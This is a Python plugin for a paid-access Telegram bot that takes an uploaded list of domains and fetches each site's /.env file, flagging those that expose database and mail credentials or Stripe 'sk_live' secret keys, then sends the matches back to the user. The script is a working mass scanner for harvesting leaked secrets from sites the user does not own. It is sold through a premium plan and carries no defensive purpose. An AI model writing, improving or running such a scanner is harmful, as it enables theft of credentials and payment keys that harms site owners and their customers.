import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import os
from concurrent.futures import ThreadPoolExecutor

from pyrogram import Client, filters

from plugins.func.users_sql import *

session = requests.session()
s = requests.session()


class ENV:
    def scan_sk_credentials(self, target):
        mch = ["DB_HOST=", "MAIL_HOST=", "MAIL_USERNAME=", "sk_live", "APP_ENV="]
        try:
            url = f"http://{target}/.env"
            response = requests.get(url, verify=False, timeout=10)

            if response.status_code == 200 and any(key in response.text for key in mch):
                return f"SK Credentials found in: {url}"

            url = f"https://{target}/.env"
            response = requests.get(url, verify=False, timeout=10)

            if response.status_code == 200 and any(key in response.text for key in mch):
                return f"SK Credentials found in: {url}"

            return None
        except:
            return None


@Client.on_message(filters.command("env"))
async def cmd_envscanner(Client, message):
    try:
        # NES TOOLS
        user_id = str(message.from_user.id)
        chat_type = str(message.chat.type)
        str(message.chat.id)
        regdata = fetchinfo(user_id)
        results = str(regdata)
        if results == "None":
            resp = "You Are Not Registered ⚠️. First Register By Using /register To Use Me ."
            await message.reply_text(resp, message.id)
        else:
            #
            # PLAN CHECK
            await plan_expirychk(user_id)
            # PM AND AUTH CHECK
            pm = fetchinfo(user_id)
            status = pm[2]
            role = status
            open("plugins/group.txt").read().splitlines()
            if chat_type == "ChatType.PRIVATE" and status == "FREE":
                resp = "⚠️ #PREMIUM_ONLY ⚠️ \n Contact @K3VIN_X To Buy Premium Access !.Else You Can Use Free Then Join @MorPhoChat !"
                await message.reply_text(resp, message.id)
            else:

                if not message.reply_to_message:
                    return await message.reply_text("Please Reply To File")
                if not message.reply_to_message.document:
                    return await message.reply_text("Please Reply To File")
                tic = time.perf_counter()
                ms_ = "ENV Scanning...."
                domain_file = await message.reply_to_message.download(
                    progress_args=(ms_, f"`Downloading This File!`")
                )
                with open(domain_file, "r") as file:
                    domains = file.read().splitlines()
                x = len(domains)
                await message.reply_text(ms_)
                results = []
                y = len(results)
                env_scanner = ENV()
                try:
                    with ThreadPoolExecutor(max_workers=5) as executor:
                        for i, result in enumerate(
                            executor.map(env_scanner.scan_sk_credentials, domains)
                        ):
                            if result:
                                results.append(result)

                    if results:
                        result_text = "\n".join(results)
                        with open(f"{x}x_SK_BY_@JoannaChkBot.txt", "w") as result_file:
                            result_file.write(result_text)
                        toc = time.perf_counter()
                        str(message.chat.id)
                        x = len(results)
                        resp = f"""
SK ENV SCAN COMPLETED ✅

┏－－－－－－－－－－－－┒
┠ SK - <code>{x}</code>
┠ Result SK - {y}
┠ Time To Scan - {toc - tic:0.4f}sec
┠ Scan By - <a href="tg://user?id={message.from_user.id}"> {message.from_user.first_name}</a> [ {role} ]
┠ 𝘋𝘦𝘝 - <a href="tg://user?id=1418571871">̠K̠̠E̠̠V̠̠I̠̠N̠ ̠X̠ ⚠️</a>
┗－－－－－－－－－－－－┛"""
                        await message.reply_document(
                            document=f"{x}x_SK_BY_@JoannaChkBot.txt",
                            caption=resp,
                            reply_to_message_id=message.id,
                        )
                        os.remove(f"{x}x_SK_BY_@JoannaChkBot.txt")
                    else:
                        await message.reply_text("Try Next No SK Found Sad", message.id)
                except Exception as e:
                    print(e)
    except Exception as e:
        print(e)
